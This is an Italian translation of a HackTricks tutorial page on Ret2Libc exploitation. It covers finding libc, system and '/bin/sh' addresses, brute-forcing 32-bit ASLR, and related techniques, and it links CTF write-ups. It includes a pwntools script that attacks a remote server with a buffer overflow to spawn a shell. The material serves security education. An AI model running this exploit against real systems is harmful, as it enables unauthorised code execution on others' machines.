# Ret2lib

<details>

<summary><strong>Impara l'hacking AWS da zero a ero con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Informazioni di Base**

L'essenza di **Ret2Libc** √® quella di reindirizzare il flusso di esecuzione di un programma vulnerabile verso una funzione all'interno di una libreria condivisa (ad esempio, **system**, **execve**, **strcpy**) anzich√© eseguire shellcode fornito dall'attaccante nello stack. L'attaccante crea un payload che modifica l'indirizzo di ritorno nello stack per puntare alla funzione della libreria desiderata, predisponendo anche eventuali argomenti necessari in base alla convenzione di chiamata.

### **Passaggi di Esempio (semplificati)**

* Ottenere l'indirizzo della funzione da chiamare (ad esempio, system) e il comando da chiamare (ad esempio, /bin/sh)
* Generare una catena ROP per passare il primo argomento puntando alla stringa del comando e il flusso di esecuzione alla funzione

## Trovare gli indirizzi

* Supponendo che la `libc` utilizzata sia quella della macchina corrente, puoi trovare dove verr√† caricata in memoria con:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Se vuoi verificare se l'ASLR sta cambiando l'indirizzo di libc, puoi fare:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Sapendo quale libc viene utilizzato, √® anche possibile trovare l'offset alla funzione `system` con:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Sapendo quale libc viene utilizzato, √® anche possibile trovare l'offset alla stringa della funzione `/bin/sh` con:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Usando gdb-peda / GEF

Conoscendo la libc utilizzata, √® anche possibile utilizzare Peda o GEF per ottenere l'indirizzo della funzione **system**, della funzione **exit** e della stringa **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Usando /proc/\<PID>/maps

Se il processo crea **figli** ogni volta che si comunica con esso (server di rete) prova a **leggere** quel file (probabilmente avrai bisogno dei permessi di root).

Qui puoi trovare **esattamente dove √® caricata la libc** all'interno del processo e **dove verr√† caricata** per ogni figlio del processo.

![](<../../../.gitbook/assets/image (853).png>)

In questo caso √® caricata in **0xb75dc000** (Questo sar√† l'indirizzo di base della libc)

## Libreria libc sconosciuta

Potrebbe essere possibile che **non conosci la libc caricata** dal binario (perch√© potrebbe trovarsi in un server a cui non hai accesso). In tal caso potresti sfruttare la vulnerabilit√† per **ottenere informazioni su alcuni indirizzi e scoprire quale libreria libc** viene utilizzata:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

E puoi trovare un modello di pwntools per questo in:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Conoscere la libc con 2 offset

Controlla la pagina [https://libc.blukat.me/](https://libc.blukat.me/) e utilizza un **paio di indirizzi** di funzioni all'interno della libc per scoprire la **versione utilizzata**.

## Bypassare l'ASLR in 32 bit

Questi attacchi di forza bruta sono **utili solo per sistemi a 32 bit**.

* Se l'exploit √® locale, puoi provare a forzare l'indirizzo di base della libc (utile per sistemi a 32 bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Se si attacca un server remoto, potresti provare a **forzare l'indirizzo della funzione `usleep` della `libc`**, passando come argomento 10 (ad esempio). Se a un certo punto il **server impiega 10 secondi in pi√π per rispondere**, hai trovato l'indirizzo di questa funzione.

## One Gadget

Esegui una shell saltando direttamente a **un** specifico **indirizzo** nella `libc`:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## Esempio di Codice x86 Ret2lib

In questo esempio, il brute-force di ASLR √® integrato nel codice e il binario vulnerabile √® situato su un server remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Esempio di codice x64 Ret2lib

Controlla l'esempio da:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Esempio di ARM64 Ret2lib

Nel caso di ARM64, l'istruzione ret salta dove punta il registro x30 e non dove punta il registro dello stack. Quindi √® un po' pi√π complicato.

Inoltre, in ARM64 un'istruzione fa ci√≤ che l'istruzione fa (non √® possibile saltare nel mezzo delle istruzioni e trasformarle in nuove).

Controlla l'esempio da:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (o puts)

Questo permette di **rilevare informazioni dal processo** chiamando `printf`/`puts` con alcuni dati specifici posizionati come argomento. Ad esempio, mettendo l'indirizzo di `puts` nel GOT in una chiamata a `puts` permetter√† di **rilevare l'indirizzo di `puts` in memoria**.

## Ret2printf

Questo significa fondamentalmente abusare di un **Ret2lib per trasformarlo in una vulnerabilit√† di stringhe di formato di `printf`** utilizzando il `ret2lib` per chiamare printf con i valori da sfruttare (sembra inutile ma √® possibile):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Altri Esempi e riferimenti

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, dato un leak all'indirizzo di una funzione in libc, utilizzando un gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR abilitato ma nessun PIE, il primo passo √® riempire un overflow fino al byte 0x00 del canary per poi chiamare puts e rilevarlo. Con il canary viene creato un gadget ROP per chiamare puts e rilevare l'indirizzo di puts dal GOT e un gadget ROP per chiamare `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR abilitato, nessun canary, stack overflow in main da una funzione figlio. Gadget ROP per chiamare puts e rilevare l'indirizzo di puts dal GOT e poi chiamare un gadget one.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bit, nessun pie, nessun canary, nessun relro, nx. Utilizza la funzione write per rilevare l'indirizzo di write (libc) e chiama un gadget one.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Utilizza una stringa di formato per rilevare il canary dallo stack e un buffer overflow per chiamare system (√® nel GOT) con l'indirizzo di `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, nessun relro, nessun canary, nx, pie. Abusa di un cattivo indicizzazione per rilevare gli indirizzi di libc e heap dallo stack. Abusa dell'overflow del buffer per fare un ret2lib chiamando `system('/bin/sh')` (√® necessario l'indirizzo dell'heap per eludere un controllo).
